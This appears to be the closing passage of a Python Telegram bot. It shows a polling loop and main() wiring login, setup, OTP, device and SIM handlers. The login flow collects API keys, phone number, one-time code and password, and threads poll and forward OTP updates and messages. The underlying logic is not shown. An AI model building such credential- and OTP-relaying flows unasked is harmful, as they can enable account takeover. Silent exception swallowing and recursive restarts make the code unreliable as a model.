                        cfg["processed_keys"] = processed_keys
                        save_user_configs()
                except:
                    pass
        except:
            pass
        time.sleep(0.5)

# ============================
# MAIN
# ============================
def main():
    try:
        app = Application.builder().token(BOT_TOKEN).build()

        # Start polling threads
        threading.Thread(target=poll_otp_updates, daemon=True).start()
        threading.Thread(target=poll_incoming_messages, daemon=True).start()

        # Login conversation
        login_conv = ConversationHandler(
            entry_points=[CommandHandler("login", login_start)],
            states={
                API_ID: [MessageHandler(filters.TEXT & ~filters.COMMAND, login_api_id)],
                API_HASH: [MessageHandler(filters.TEXT & ~filters.COMMAND, login_api_hash)],
                PHONE_NUMBER: [MessageHandler(filters.TEXT & ~filters.COMMAND, login_phone)],
                OTP_CODE: [MessageHandler(filters.TEXT & ~filters.COMMAND, login_otp)],
                PASSWORD: [MessageHandler(filters.TEXT & ~filters.COMMAND, login_password)],
            },
            fallbacks=[CommandHandler("cancel", login_cancel)],
        )
        app.add_handler(login_conv)

        # Setup conversation
        setup_conv = ConversationHandler(
            entry_points=[CommandHandler("setup", setup_start)],
            states={
                URL: [MessageHandler(filters.TEXT & ~filters.COMMAND, setup_url)],
                CHANNEL: [MessageHandler(filters.TEXT & ~filters.COMMAND, setup_channel)]
            },
            fallbacks=[CommandHandler("cancel", setup_cancel)],
        )
        app.add_handler(setup_conv)

        # OTP conversation
        otp_conv = ConversationHandler(
            entry_points=[CommandHandler("setotp", setotp_command)],
            states={
                WAITING_OTP_NUMBER: [MessageHandler(filters.TEXT & ~filters.COMMAND, otp_number_input)]
            },
            fallbacks=[CommandHandler("cancel", otp_cancel)],
        )
        app.add_handler(otp_conv)

        # Callbacks
        app.add_handler(CallbackQueryHandler(device_callback, pattern="^dev_"))
        app.add_handler(CallbackQueryHandler(sim_callback, pattern="^sim_"))

        # Commands
        app.add_handler(CommandHandler("start", start))
        app.add_handler(CommandHandler("help", help_command))
        app.add_handler(CommandHandler("devices", devices_command))
        app.add_handler(CommandHandler("resetforward", reset_forward))
        app.add_handler(CommandHandler("logout", logout_command))
        app.add_handler(CommandHandler("status", status_command))

        logger.info("🚀 BOT STARTED!")
        logger.info("🔐 Login System: Active")
        app.run_polling(allowed_updates=Update.ALL_TYPES)
        
    except Exception as e:
        logger.error(f"Main error: {e}")
        time.sleep(5)
        main()

if __name__ == "__main__":
    main()